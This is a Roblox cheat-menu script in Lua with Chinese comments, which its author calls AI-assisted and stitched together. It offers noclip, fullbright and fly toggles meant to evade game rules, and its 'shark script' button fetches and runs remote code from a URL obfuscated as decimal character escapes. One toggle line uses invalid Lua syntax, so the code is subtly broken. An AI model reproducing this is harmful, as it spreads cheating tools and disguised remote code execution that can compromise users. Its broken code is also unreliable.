-- Roblox ChatGPT风格UI脚本
-- 介绍: AI+缝合（看源码何意味）
-- 版本: beta

if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("ChatGPTStyleUI") then
    game:GetService("Players").LocalPlayer.PlayerGui.ChatGPTStyleUI:Destroy()
end

-- 创建主UI
local PlayerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ChatGPTStyleUI"
ScreenGui.Parent = PlayerGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- 主框架
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 600, 0, 400)
MainFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
MainFrame.BackgroundColor3 = Color3.fromRGB(32, 33, 35)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

-- 圆角
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

-- 标题栏
local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Size = UDim2.new(1, 0, 0, 30)
TitleBar.BackgroundColor3 = Color3.fromRGB(52, 53, 65)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 8)
TitleCorner.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "TitleLabel"
TitleLabel.Size = UDim2.new(1, -60, 1, 0)
TitleLabel.Position = UDim2.new(0, 10, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "菜单"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.Font = Enum.Font.Gotham
TitleLabel.TextSize = 14
TitleLabel.Parent = TitleBar

-- 关闭按钮
local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Position = UDim2.new(1, -30, 0, 0)
CloseButton.BackgroundColor3 = Color3.fromRGB(52, 53, 65)
CloseButton.BorderSizePixel = 0
CloseButton.Text = "×"
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.Font = Enum.Font.GothamBold
CloseButton.TextSize = 18
CloseButton.Parent = TitleBar

-- 最小化按钮
local MinimizeButton = Instance.new("TextButton")
MinimizeButton.Name = "MinimizeButton"
MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
MinimizeButton.Position = UDim2.new(1, -60, 0, 0)
MinimizeButton.BackgroundColor3 = Color3.fromRGB(52, 53, 65)
MinimizeButton.BorderSizePixel = 0
MinimizeButton.Text = "-"
MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeButton.Font = Enum.Font.GothamBold
MinimizeButton.TextSize = 18
MinimizeButton.Parent = TitleBar

-- 内容区域
local ContentFrame = Instance.new("Frame")
ContentFrame.Name = "ContentFrame"
ContentFrame.Size = UDim2.new(1, 0, 1, -30)
ContentFrame.Position = UDim2.new(0, 0, 0, 30)
ContentFrame.BackgroundTransparency = 1
ContentFrame.Parent = MainFrame

-- 左侧按钮区域
local LeftPanel = Instance.new("Frame")
LeftPanel.Name = "LeftPanel"
LeftPanel.Size = UDim2.new(0, 150, 1, 0)
LeftPanel.BackgroundColor3 = Color3.fromRGB(43, 44, 55)
LeftPanel.BorderSizePixel = 0
LeftPanel.Parent = ContentFrame

local LeftPanelCorner = Instance.new("UICorner")
LeftPanelCorner.CornerRadius = UDim.new(0, 8)
LeftPanelCorner.Parent = LeftPanel

-- 按钮容器（带滚动）
local ButtonsScrollingFrame = Instance.new("ScrollingFrame")
ButtonsScrollingFrame.Name = "ButtonsScrollingFrame"
ButtonsScrollingFrame.Size = UDim2.new(1, 0, 1, 0)
ButtonsScrollingFrame.BackgroundTransparency = 1
ButtonsScrollingFrame.BorderSizePixel = 0
ButtonsScrollingFrame.ScrollBarThickness = 4
ButtonsScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
ButtonsScrollingFrame.Parent = LeftPanel

local ButtonsLayout = Instance.new("UIListLayout")
ButtonsLayout.Parent = ButtonsScrollingFrame
ButtonsLayout.Padding = UDim.new(0, 5)

-- 右侧内容区域
local RightPanel = Instance.new("Frame")
RightPanel.Name = "RightPanel"
RightPanel.Size = UDim2.new(1, -160, 1, 0)
RightPanel.Position = UDim2.new(0, 160, 0, 0)
RightPanel.BackgroundColor3 = Color3.fromRGB(52, 53, 65)
RightPanel.BorderSizePixel = 0
RightPanel.Parent = ContentFrame

local RightPanelCorner = Instance.new("UICorner")
RightPanelCorner.CornerRadius = UDim.new(0, 8)
RightPanelCorner.Parent = RightPanel

-- 创建按钮函数
local function CreateButton(text, name)
    local Button = Instance.new("TextButton")
    Button.Name = name
    Button.Size = UDim2.new(1, -10, 0, 40)
    Button.Position = UDim2.new(0, 5, 0, 0)
    Button.BackgroundColor3 = Color3.fromRGB(52, 53, 65)
    Button.BorderSizePixel = 0
    Button.Text = text
    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    Button.Font = Enum.Font.Gotham
    Button.TextSize = 14
    Button.AutoButtonColor = true
    
    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.CornerRadius = UDim.new(0, 6)
    ButtonCorner.Parent = Button
    
    return Button
end

-- 创建四个主要按钮
local InfoButton = CreateButton("信息", "InfoButton")
local GeneralButton = CreateButton("通用", "GeneralButton")
local SettingsButton = CreateButton("设置", "SettingsButton")
local GBButton = CreateButton("GB区", "GBButton")

InfoButton.Parent = ButtonsScrollingFrame
GeneralButton.Parent = ButtonsScrollingFrame
SettingsButton.Parent = ButtonsScrollingFrame
GBButton.Parent = ButtonsScrollingFrame

-- 更新滚动区域大小
ButtonsScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, ButtonsLayout.AbsoluteContentSize.Y)

ButtonsLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    ButtonsScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, ButtonsLayout.AbsoluteContentSize.Y)
end)

-- 功能开关创建函数
local function CreateToggle(name, defaultState, callback)
    local ToggleFrame = Instance.new("Frame")
    ToggleFrame.Name = name .. "Toggle"
    ToggleFrame.Size = UDim2.new(1, -20, 0, 40)
    ToggleFrame.BackgroundTransparency = 1
    ToggleFrame.Parent = RightPanel
    
    local ToggleLabel = Instance.new("TextLabel")
    ToggleLabel.Name = "Label"
    ToggleLabel.Size = UDim2.new(0.7, 0, 1, 0)
    ToggleLabel.BackgroundTransparency = 1
    ToggleLabel.Text = name
    ToggleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    ToggleLabel.Font = Enum.Font.Gotham
    ToggleLabel.TextSize = 14
    ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
    ToggleLabel.Parent = ToggleFrame
    
    local ToggleButton = Instance.new("TextButton")
    ToggleButton.Name = "Toggle"
    ToggleButton.Size = UDim2.new(0, 50, 0, 25)
    ToggleButton.Position = UDim2.new(1, -50, 0.5, -12.5)
    ToggleButton.BackgroundColor3 = defaultState and Color3.fromRGB(0, 200, 0) or Color3.fromRGB(100, 100, 100)
    ToggleButton.BorderSizePixel = 0
    ToggleButton.Text = defaultState and "ON" or "OFF"
    ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    ToggleButton.Font = Enum.Font.Gotham
    ToggleButton.TextSize = 12
    ToggleButton.Parent = ToggleFrame
    
    local ToggleCorner = Instance.new("UICorner")
    ToggleCorner.CornerRadius = UDim.new(0, 12)
    ToggleCorner.Parent = ToggleButton
    
    local isEnabled = defaultState
    
    ToggleButton.MouseButton1Click:Connect(function()
        isEnabled = not isEnabled
        ToggleButton.BackgroundColor3 = isEnabled and Color3.fromRGB(0, 200, 0) or Color3.fromRGB(100, 100, 100)
        ToggleButton.Text = isEnabled and "ON" : "OFF"
        if callback then
            callback(isEnabled)
        end
    end)
    
    return ToggleFrame, isEnabled
end

-- 创建内容滚动区域
local ContentScrollingFrame = Instance.new("ScrollingFrame")
ContentScrollingFrame.Name = "ContentScrollingFrame"
ContentScrollingFrame.Size = UDim2.new(1, 0, 1, 0)
ContentScrollingFrame.BackgroundTransparency = 1
ContentScrollingFrame.BorderSizePixel = 0
ContentScrollingFrame.ScrollBarThickness = 4
ContentScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
ContentScrollingFrame.Parent = RightPanel

local ContentLayout = Instance.new("UIListLayout")
ContentLayout.Parent = ContentScrollingFrame
ContentLayout.Padding = UDim.new(0, 10)

-- 信息页面内容
local function ShowInfoPage()
    ContentScrollingFrame:ClearAllChildren()
    
    local InfoLabel = Instance.new("TextLabel")
    InfoLabel.Name = "InfoLabel"
    InfoLabel.Size = UDim2.new(1, -20, 0, 200)
    InfoLabel.Position = UDim2.new(0, 10, 0, 10)
    InfoLabel.BackgroundTransparency = 1
    InfoLabel.Text = "脚本信息\n\n作者: AI+outave\n版本: 1.0\n\n这是一个ai+缝合脚本。\n\n功能包括:\n- 穿墙模式\n- 夜视功能\n- GB区特殊功能\n- 可自定义设置"
    InfoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    InfoLabel.Font = Enum.Font.Gotham
    InfoLabel.TextSize = 14
    InfoLabel.TextWrapped = true
    InfoLabel.TextYAlignment = Enum.TextYAlignment.Top
    InfoLabel.Parent = ContentScrollingFrame
    
    ContentScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, InfoLabel.AbsoluteSize.Y + 20)
end

-- 通用功能页面
local function ShowGeneralPage()
    ContentScrollingFrame:ClearAllChildren()
    
    -- 穿墙功能
    local NoclipToggle, NoclipState = CreateToggle("穿墙模式", false, function(state)
        NoclipState = state
        if state then
            -- 穿墙功能实现
            local player = game:GetService("Players").LocalPlayer
            if player.Character then
                for _, part in pairs(player.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end
        else
            -- 关闭穿墙
            local player = game:GetService("Players").LocalPlayer
            if player.Character then
                for _, part in pairs(player.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = true
                    end
                end
            end
        end
    end)
    NoclipToggle.Parent = ContentScrollingFrame
    
    -- 夜视功能
    local NightVisionToggle, NightVisionState = CreateToggle("夜视功能", false, function(state)
        NightVisionState = state
        if state then
            -- 启用夜视
            local Lighting = game:GetService("Lighting")
            Lighting.Ambient = Color3.new(1, 1, 1)
            Lighting.Brightness = 2
            Lighting.ClockTime = 14
        else
            -- 关闭夜视
            local Lighting = game:GetService("Lighting")
            Lighting.Ambient = Color3.new(0, 0, 0)
            Lighting.Brightness = 1
        end
    end)
    NightVisionToggle.Parent = ContentScrollingFrame
    
    -- 飞行功能
    local FlyToggle, FlyState = CreateToggle("飞行模式", false, function(state)
        FlyState = state
        if state then
            -- 飞行功能实现
            local player = game:GetService("Players").LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")
            
            -- 飞行逻辑
            local bodyVelocity = Instance.new("BodyVelocity")
            bodyVelocity.Velocity = Vector3.new(0, 0, 0)
            bodyVelocity.MaxForce = Vector3.new(0, 0, 0)
            bodyVelocity.Parent = character.HumanoidRootPart
            
            -- 飞行控制逻辑
            -- 这里需要更复杂的实现
        else
            -- 关闭飞行
            local player = game:GetService("Players").LocalPlayer
            if player.Character then
                for _, v in pairs(player.Character:GetChildren()) do
                    if v:IsA("BodyVelocity") then
                        v:Destroy()
                    end
                end
            end
        end
    end)
    FlyToggle.Parent = ContentScrollingFrame
    
    ContentScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, ContentLayout.AbsoluteContentSize.Y)
end

-- 设置页面
local function ShowSettingsPage()
    ContentScrollingFrame:ClearAllChildren()
    
    local SettingsLabel = Instance.new("TextLabel")
    SettingsLabel.Name = "SettingsLabel"
    SettingsLabel.Size = UDim2.new(1, -20, 0, 150)
    SettingsLabel.Position = UDim2.new(0, 10, 0, 10)
    SettingsLabel.BackgroundTransparency = 1
    SettingsLabel.Text = "设置\n\nUI设置:\n- 透明度调整\n- 主题颜色\n- 快捷键设置\n\n更多设置即将推出..."
    SettingsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    SettingsLabel.Font = Enum.Font.Gotham
    SettingsLabel.TextSize = 14
    SettingsLabel.TextWrapped = true
    SettingsLabel.TextYAlignment = Enum.TextYAlignment.Top
    SettingsLabel.Parent = ContentScrollingFrame
    
    ContentScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, SettingsLabel.AbsoluteSize.Y + 20)
end

-- GB区页面
local function ShowGBPage()
    ContentScrollingFrame:ClearAllChildren()
    
    local GBLabel = Instance.new("TextLabel")
    GBLabel.Name = "GBLabel"
    GBLabel.Size = UDim2.new(1, -20, 0, 60)
    GBLabel.Position = UDim2.new(0, 10, 0, 10)
    GBLabel.BackgroundTransparency = 1
    GBLabel.Text = "GB区 - 特殊功能\n\n警告: 使用此功能可能导致游戏检测，请谨慎使用。"
    GBLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    GBLabel.Font = Enum.Font.Gotham
    GBLabel.TextSize = 14
    GBLabel.TextWrapped = true
    GBLabel.TextYAlignment = Enum.TextYAlignment.Top
    GBLabel.Parent = ContentScrollingFrame
    
    local SharkButton = Instance.new("TextButton")
    SharkButton.Name = "SharkButton"
    SharkButton.Size = UDim2.new(1, -20, 0, 40)
    SharkButton.Position = UDim2.new(0, 10, 0, 80)
    SharkButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
    SharkButton.BorderSizePixel = 0
    SharkButton.Text = "启动鲨鱼脚本"
    SharkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    SharkButton.Font = Enum.Font.GothamBold
    SharkButton.TextSize = 16
    SharkButton.Parent = ContentScrollingFrame
    
    local SharkCorner = Instance.new("UICorner")
    SharkCorner.CornerRadius = UDim.new(0, 6)
    SharkCorner.Parent = SharkButton
    
    local sharkEnabled = false
    
    SharkButton.MouseButton1Click:Connect(function()
        if not sharkEnabled then
            sharkEnabled = true
            SharkButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
            SharkButton.Text = "停止鲨鱼脚本"
            
            -- 执行鲨鱼脚本
            local success, err = pcall(function()
                loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\115\108\101\101\110\110\100\110\47\77\97\116\100\115\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\98\105\50\46\48"))()
            end)
            
            if not success then
                warn("鲨鱼脚本加载失败: " .. tostring(err))
                SharkButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
                SharkButton.Text = "启动失败 - 重试"
                sharkEnabled = false
            end
        else
            sharkEnabled = false
            SharkButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
            SharkButton.Text = "启动鲨鱼脚本"
            -- 这里可以添加停止脚本的逻辑
        end
    end)
    
    ContentScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 140)
end

-- 按钮点击事件
InfoButton.MouseButton1Click:Connect(ShowInfoPage)
GeneralButton.MouseButton1Click:Connect(ShowGeneralPage)
SettingsButton.MouseButton1Click:Connect(ShowSettingsPage)
GBButton.MouseButton1Click:Connect(ShowGBPage)

-- 默认显示信息页面
ShowInfoPage()

-- UI拖动功能
local dragging = false
local dragInput, dragStart, startPos

local function update(input)
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

-- 关闭和最小化功能
local isMinimized = false
local originalSize = MainFrame.Size
local originalPosition = MainFrame.Position

CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

MinimizeButton.MouseButton1Click:Connect(function()
    if not isMinimized then
        MainFrame.Size = UDim2.new(0, 200, 0, 30)
        MainFrame.Position = UDim2.new(1, -210, 0, 10)
        ContentFrame.Visible = false
        isMinimized = true
        MinimizeButton.Text = "+"
    else
        MainFrame.Size = originalSize
        MainFrame.Position = originalPosition
        ContentFrame.Visible = true
        isMinimized = false
        MinimizeButton.Text = "-"
    end
end)

-- 自动更新布局
ContentLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    ContentScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, ContentLayout.AbsoluteContentSize.Y + 20)
end)

print("已加载！使用鼠标拖动标题栏移动UI。")
